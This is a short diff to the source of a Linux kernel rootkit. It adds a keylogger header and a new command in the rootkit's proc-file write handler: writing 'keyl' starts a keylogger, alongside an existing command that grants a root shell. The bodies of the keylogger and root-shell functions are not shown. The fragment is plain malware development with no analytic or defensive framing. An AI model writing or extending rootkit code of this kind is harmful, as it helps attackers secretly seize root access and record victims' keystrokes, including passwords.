@@ -13,6 +13,7 @@
 #include "header/hide.h"
 #include "header/config.h"
 #include "header/shell.h"
+#include "header/keylogger.h"
 
 
 
@@ -37,6 +38,10 @@ ssize_t handler_write_proc_file(
     else if (strncmp(buffer, "root", 4) == 0) {
         root_shell();
         printk("rootkit: GET ROOT SHELL\n");
+    }
+    else if (strncmp(buffer, "keyl", 4) == 0) {
+        keylogger();
+        printk("rootkit: KEYLOGGER START\n");
     }
 
     return length;
